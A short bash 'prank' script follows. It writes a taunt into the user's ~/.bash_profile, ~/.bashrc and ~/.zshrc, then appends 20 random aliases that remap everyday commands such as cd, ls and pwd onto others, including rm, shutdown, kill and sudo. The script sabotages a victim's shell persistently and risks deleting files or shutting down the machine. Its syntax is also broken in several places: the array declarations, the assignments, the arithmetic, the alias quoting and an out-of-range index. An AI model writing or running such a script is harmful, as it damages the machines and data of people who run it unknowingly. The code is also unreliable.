#!/bin/bash

a = ("cd", "which", "whois", "du", "date", "killall", "uptime", "top", "wget", "pwd", "w", "git")
b = ("cal", "ps", "ls", "tree", "sudo", "apt", "du", "mkdir", "rm", "bg", "shutdown", "kill")

aliases = 0
echo "You Got Pranked Dude !!" >> ~/.bash_profile
echo "You Got Pranked Dude !!" >> ~/.bashrc
echo "You Got Pranked Dude !!" >> ~/.zshrc
while [ $aliases -lt 20 ]
do
    i = $ (( RANDOM % 13 + 1 ))
    j = $ (( RANDOM % 13 + 1 ))
    echo "alias ${a[$i]}=\"${b[$j]}" >> ~/.bash_profile
    echo "alias ${a[$i]}=\"${b[$j]}" >> ~/.bashrc
    echo "alias ${a[$i]}=\"${b[$j]}" >> ~/.zshrc

    aliases = `expr $aliases + 1`
done